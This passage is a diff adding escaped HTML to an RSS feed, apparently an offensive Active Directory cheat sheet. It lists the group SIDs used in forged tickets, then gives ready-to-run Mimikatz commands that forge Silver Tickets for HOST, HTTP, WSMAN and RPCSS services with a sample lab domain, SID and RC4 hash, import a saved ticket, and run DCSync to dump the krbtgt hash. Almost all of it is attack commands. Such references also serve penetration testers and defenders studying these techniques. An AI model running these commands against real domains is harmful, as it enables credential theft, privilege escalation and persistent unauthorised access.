+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;p>&lt;strong>Silver Ticket Default Groups&lt;/strong>&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Group&lt;/th>
+&lt;th>SID&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Domain Users&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-513&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Domain Admins&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-512&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Schema Admins&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-518&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Enterprise Admins*&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-519&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Group Policy Creator Owners&lt;/td>
+&lt;td>S-1-5-21-[DOMAIN_ID]-520&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>*This is only effective when the forged ticket is created in the Forest root domain, though add using /sids parameter for AD forest admin rights.&lt;/p>
+&lt;p>In order to enable PowerShell Remoting the Silver Tickets for HOST, HTTP, WSMAN and RPCSS must be generated:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HOST /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HTTP /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:WSMAN /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:RPCSS /ptt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HOST /ptt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:HTTP /ptt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:WSMAN /ptt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-3213520406-898593589-2043675049 /rc4:f9c4b6d4b94e39ea0391a16b3deacc16/target:computer1.cyberlab.cybercorp.local /service:RPCSS /ptt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Import a previously created ticket:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::ptt ticket.kirbi&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # kerberos::ptt ticket.kirbi
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dcsync">DCSync&lt;/h2>
+&lt;p>Use the DCSync feature to get krbtgt hash (requires DCSync privileges):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt /domain:cyberlab.local&amp;#34;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: mimikatz.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcsync /user:cyberlab\krbtgt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcsync /user:cyberlab\krbtgt /domain:cyberlab.local
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item></channel></rss>
